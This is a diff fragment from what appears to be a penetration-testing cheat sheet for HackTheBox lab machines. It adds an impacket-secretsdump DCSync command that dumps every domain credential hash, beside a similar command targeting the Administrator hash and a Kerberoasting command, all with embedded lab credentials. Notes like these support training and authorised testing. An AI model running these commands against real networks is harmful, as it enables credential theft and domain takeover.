@@ -518,6 +518,7 @@ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStro
 ```
 #### DCsync
 ```bash
+impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc
 impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm
 
 # SAM
